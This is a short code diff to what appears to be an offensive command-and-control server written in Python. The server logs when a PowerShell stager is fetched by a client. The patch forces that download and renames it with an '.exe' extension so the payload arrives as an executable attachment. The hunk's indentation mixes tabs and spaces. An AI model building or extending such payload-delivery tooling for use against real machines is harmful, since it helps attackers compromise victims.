@@ -34,7 +34,7 @@ def HTTPDFactory(config):
 	    self.set_custom_headers()
             if force_download:
                 self.send_header("Content-Type", "application/octet-stream")
-                self.send_header("Content-Disposition", 'attachment; filename="%s"' % self.path.rsplit("/", 1)[1])
+                self.send_header("Content-Disposition", 'attachment; filename="%s"' % self.path.split("/", 1)[1].replace("/exe/", ".exe"))
             else:
                 self.send_header("Content-Type", "text/html")
             self.end_headers()
@@ -112,6 +112,7 @@ def HTTPDFactory(config):
             path = self.path.split("/")[-1]
             payload_path = self.path.split("/")
             if payload_path[1] == self.config.get("http-download-path"):
+		force_download = True
                 Log.log_event("Download Stager", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
 		payload = Payload(self.config)
 
